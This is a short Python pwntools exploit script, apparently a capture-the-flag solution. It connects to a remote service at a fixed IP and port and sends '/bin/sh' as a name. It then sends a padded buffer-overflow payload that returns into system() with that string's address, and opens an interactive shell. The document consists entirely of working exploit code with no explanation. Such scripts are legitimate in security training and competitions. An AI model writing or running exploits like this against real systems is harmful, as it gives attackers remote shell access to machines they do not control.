from pwn import *

p = remote('220.249.52.133','36906')
binsh = 0x0804A080
sys = 0x0804855A
paylaod = 'a'*(0x26+0x4) + p32(sys) + p32(binsh)

p.sendlineafter('please tell me your name','/bin/sh')
p.sendlineafter('hello,you can leave some message here:',paylaod)
p.interactive()
